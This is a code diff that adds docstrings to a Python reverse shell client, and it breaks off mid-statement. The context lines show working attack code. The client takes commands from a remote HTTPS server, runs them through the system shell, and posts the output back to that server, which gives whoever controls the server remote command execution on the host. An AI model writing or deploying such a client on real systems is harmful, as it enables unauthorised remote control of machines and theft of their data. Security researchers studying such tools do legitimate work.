@@ -15,12 +15,21 @@ from urllib import request, parse
 
 class ClientCommands:
     def __init__(self, client):
+        """Dispatch commands received from the server to their respective
+        methods, depending on their format.
+
+        :param client: Instance of Client through which commands will be
+            received.
+        """
         self.client = client
 
     def _send_output(self, message: [str, bytes]) -> None:
+        """Wrapper for the client's 'post' method."""
         self.client.post({"output": message})
 
     def cd(self, dest_dir: [str, list]) -> None:
+        """Handles change of working directory in the shell."""
+
         try:
             dest_dir = "~" if len(dest_dir) == 0 else "".join(dest_dir)
             os.chdir(Path(dest_dir).expanduser())
@@ -28,6 +37,9 @@ class ClientCommands:
             self._send_output(f"{e}\n")
 
     def shell(self, command: str) -> None:
+        """Handles all standard shell commands received from the
+        server."""
+
         try:
             cmd = subprocess.run(command, capture_output=True, shell=True)
         except FileNotFoundError as e:
@@ -43,6 +55,15 @@ class Client:
                  server_address: str,
                  server_port: int,
                  ca_file: [str, Path]):
+        """Create a Reverse Shell Client that receives commands from a
+        server though HTTPS.
+
+        :param server_address: Hostname or address of the server.
+        :param server_port: Port number used by the server.
+        :param ca_file: Absolute path to a file containing the
+            certificate for the Certificate Authority (CA).
+        """
+
         self.server_url = f"https://{server_address}:{server_port}"
         self.commands = ClientCommands(self)
         self.ssl_context = ssl.create_default_context(
@@ -52,9 +73,19 @@ class Client:
 
     @property
     def _shell_prompt(self) -> str:
+        """Returns a string containing shell prompt information in the
+        format user@host:/path/to/cwd$"""
+
         return f"{platform.node()}@{getpass.getuser()}:{str(Path.cwd())}$ "
 
     def post(self, request_body: dict[str, str]) -> str:
+        """Send a POST request to the server.
+
+        :param request_body: A dictionary containing key-value pairs to
+            be sent as the body of the POST request.
+        :return: A response to the POST request.
+        """
+
         request_body: bytes = parse.urlencode(request_body).encode()
         url = request.Request(self.server_url, data=request_body)
         return (request
